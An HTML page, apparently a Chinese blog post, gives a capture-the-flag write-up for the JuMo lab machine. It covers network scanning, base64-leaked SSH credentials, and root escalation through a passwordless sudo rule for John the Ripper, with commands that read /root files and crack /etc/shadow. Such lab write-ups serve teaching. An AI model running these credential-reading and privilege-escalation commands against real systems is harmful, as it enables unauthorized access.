@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
+<meta name="description" content="### 1. 简介
+
+- 靶机名称: JuMo (未发布，内部测试靶机，可能后续发布于 HackMyVm)
+- 难度: 低 (Low)
+- 目标 IP: 192.168.205.182 (通过 arp-scan 发现)
+- 攻击机 IP: 192.168.205.128
+- 目标: 获取目标系统的 root 权限并找到 flag。">
+<meta property="og:title" content="渗透测试报告 - JuMo (测试靶机)">
+<meta property="og:description" content="### 1. 简介
+
+- 靶机名称: JuMo (未发布，内部测试靶机，可能后续发布于 HackMyVm)
+- 难度: 低 (Low)
+- 目标 IP: 192.168.205.182 (通过 arp-scan 发现)
+- 攻击机 IP: 192.168.205.128
+- 目标: 获取目标系统的 root 权限并找到 flag。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html">
+<meta property="og:image" content="https://hub.gitmirror.com/https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250320200605137.png">
+<title>渗透测试报告 - JuMo (测试靶机)</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">渗透测试报告 - JuMo (测试靶机)</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/55" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>1. 简介</h3>
+<ul>
+<li>靶机名称: JuMo (未发布，内部测试靶机，可能后续发布于 HackMyVm)</li>
+<li>难度: 低 (Low)</li>
+<li>目标 IP: 192.168.205.182 (通过 arp-scan 发现)</li>
+<li>攻击机 IP: 192.168.205.128</li>
+<li>目标: 获取目标系统的 root 权限并找到 flag。</li>
+</ul>
+<h3>2. 信息收集 (Enumeration)</h3>
+<h4>2.1. 主机发现</h4>
+<p>首先，使用 arp-scan 在本地网络中发现目标主机的 IP 地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="pl-c"><span class="pl-c">#</span> ... (其他输出) ...</span>
+192.168.205.182 08:00:27:ff:bf:ce       PCS Systemtechnik GmbH <span class="pl-c"><span class="pl-c">#</span>&lt;-- 目标主机</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (其他输出) ...</span>
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 2.033 seconds (125.92 hosts/sec). 4 responded</pre></div>
+<p>确认目标 IP 为 192.168.205.182。</p>
+<h4>2.2. 端口扫描</h4>
+<p>使用 nmap 对目标主机进行全端口扫描，以识别开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -p- 192.168.205.182
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 08:46 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.182
+Host is up (0.00022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh     <span class="pl-c"><span class="pl-c">#</span>&lt;-- SSH 服务开放</span>
+80/tcp open  http    <span class="pl-c"><span class="pl-c">#</span>&lt;-- HTTP 服务开放</span>
+MAC Address: 08:00:27:FF:BF:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.47 seconds</pre></div>
+<p>扫描结果显示目标开放了 22 (SSH) 和 80 (HTTP) 端口。</p>
+<h3>3. 获取初始访问权限 (Initial Foothold)</h3>
+<h4>3.1. Web 服务探测</h4>
+<p>访问目标主机的 80 端口（<a href="http://192.168.205.182%EF%BC%89%E3%80%82" rel="nofollow">http://192.168.205.182）。</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7106819b2b2817163593d4b4270a8593ced25b410ec2fda2b64023323b42027f/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038343832343536362e706e67"><img src="https://camo.githubusercontent.com/7106819b2b2817163593d4b4270a8593ced25b410ec2fda2b64023323b42027f/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038343832343536362e706e67" alt="image-20250411084817446" data-canonical-src="https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411084824566.png" style="max-width: 100%;"></a></p>
+<p>这个提示我们在 hackmyvm 平台上查找一个名为 check 的用户。</p>
+<h4>3.2. 信息挖掘</h4>
+<p>在 HackMyVm 网站上搜索用户 check。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f015c27496ec7b7b02148015958306e1de18f80b979fc2b6170db22389ab57bf/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038353034343933392e706e67"><img src="https://camo.githubusercontent.com/f015c27496ec7b7b02148015958306e1de18f80b979fc2b6170db22389ab57bf/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038353034343933392e706e67" alt="image-20250411085044849" data-canonical-src="https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411085044939.png" style="max-width: 100%;"></a></p>
+<p>找到了该用户的个人资料，其中包含一个外部链接。访问该链接：</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c5136f77580440926d81f279d18e6d18d4f3fb2f7ef1fb73895cee4a971e4705/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038353331343135302e706e67"><img src="https://camo.githubusercontent.com/c5136f77580440926d81f279d18e6d18d4f3fb2f7ef1fb73895cee4a971e4705/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313038353331343135302e706e67" alt="image-20250411085314126" data-canonical-src="https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411085314150.png" style="max-width: 100%;"></a></p>
+<p>页面上有一串 Base64 编码的字符串 d2VsY29tZTpqdW1v。对其进行解码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>d2VsY29tZTpqdW1v<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d
+welcome:jumo</pre></div>
+<p>解码后得到 welcome:jumo，这很可能是一对 SSH 登录凭据（用户名:密码）。</p>
+<h4>3.3. SSH 登录</h4>
+<p>使用获取到的凭据尝试 SSH 登录：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ ssh welcome@192.168.205.182
+<span class="pl-c"><span class="pl-c">#</span> ...(SSH 连接确认)...</span>
+Password: <span class="pl-c"><span class="pl-c">#</span> 输入密码 jumo</span>
+Linux JuMo 4.19.0-12-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (欢迎信息) ...</span>
+welcome@JuMo:<span class="pl-k">~</span>$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
+<p>成功以 welcome 用户身份登录系统。</p>
+<h3>4. 权限提升 (Privilege Escalation)</h3>
+<h4>4.1. Sudo 权限检查</h4>
+<p>检查 welcome 用户拥有的 sudo 权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@JuMo:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on JuMo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User welcome may run the following commands on JuMo:
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/sbin/john   <span class="pl-c"><span class="pl-c">#</span>&lt;-- 可以免密以 root 权限执行 john</span></pre></div>
+<p>输出显示 welcome 用户可以无需密码 (NOPASSWD) 以任何用户 (ALL:ALL) 的身份执行 /usr/sbin/john 命令。john (John the Ripper) 是一个密码破解工具。</p>
+<h4>4.2. 利用 Sudo 权限</h4>
+<p>由于可以以 root 身份执行 john，并且 /root 目录下的文件通常只有 root 用户可读，我们可以尝试利用 john 读取 /root 目录下的文件。</p>
+<p>方法一：直接读取可能的 Flag 文件 (我的方法)</p>
+<p>我已知 /root/root.txt 包含了 flag。虽然 john 的 --wordlist 选项通常用于指定密码字典，但配合 --stdout 选项，john 会将 wordlist 的内容（或生成的候选密码）打印到标准输出。利用 sudo 权限，这可以用来读取 root 权限才能访问的文件内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@JuMo:<span class="pl-k">~</span>$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+flag{521ca933d6e159a50c2c04e7daa930f6}  <span class="pl-c"><span class="pl-c">#</span>&lt;-- 读取并输出了 /root/root.txt 的内容</span>
+1p 0:00:00:00 100% 100.0p/s flag{521ca933d6e159a50c2c04e7daa930f6}</pre></div>
+<p>此命令成功读取了 /root/root.txt 文件，内容即为 flag。</p>
+<p>方法二：破解 Root 密码 (ta0神的方法)</p>
+<p>更常见的利用 john 进行提权的方式是破解 /etc/shadow 文件中的密码哈希。这里假设 /root/root.txt 文件恰好包含了 root 用户的密码（或者可以直接作为字典）。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@JuMo:<span class="pl-k">~</span>$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt
+Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [<span class="pl-k">?</span>/64])
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} <span class="pl-c"><span class="pl-c">#</span>&lt;-- 破解出的 root 密码</span>
+Session completed</pre></div>
+<p>john 成功利用 /root/root.txt 的内容（即 flag）作为字典，破解了 /etc/shadow 文件中的 root 用户密码哈希。破解得到的 root 密码正是 flag{521ca933d6e159a50c2c04e7daa930f6}。</p>
+<h4>4.3. 获取 Root 权限</h4>
+<p>根据群主提示我们可知root密码为root flag</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@JuMo:<span class="pl-k">~</span>$ su -
+Password: <span class="pl-c"><span class="pl-c">#</span> 输入 521ca933d6e159a50c2c04e7daa930f6</span>
+root@JuMo:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)
+root@JuMo:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+flag{521ca933d6e159a50c2c04e7daa930f6}</pre></div>
+<p>成功获取 root 权限。最终的 flag 存储在 /root/root.txt 中。</p>
+<h3>5. 总结</h3>
+<p>本次渗透测试通过以下步骤完成：</p>
+<ol>
+<li>信息收集: 使用 arp-scan 和 nmap 发现目标主机及其开放的 SSH 和 HTTP 服务。</li>
+<li>初始访问: 分析网页源代码，发现指向 HackMyVm 用户 check 的线索，进而找到其外部链接中的 Base64 编码凭据，成功通过 SSH 登录 welcome 用户。</li>
+<li>权限提升: 发现 welcome 用户可通过 sudo 免密执行 john 命令。利用此权限，通过 john --wordlist=/root/root.txt --stdout 直接读取了 /root/root.txt 中的 flag，或者通过 john /etc/shadow --wordlist=/root/root.txt 破解出 root 密码（密码恰好是 flag），最终使用 su 命令切换到 root 用户。</li>
+</ol>
+<p>靶机设计巧妙，利用了信息泄露和 sudo 配置不当的漏洞，难度符合 Low 级别。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("10/12/2024"!=""){
+    var startSite=new Date("10/12/2024");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src='https://blog.meekdai.com/Gmeek/plugins/articletoc.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>
+
+</html>
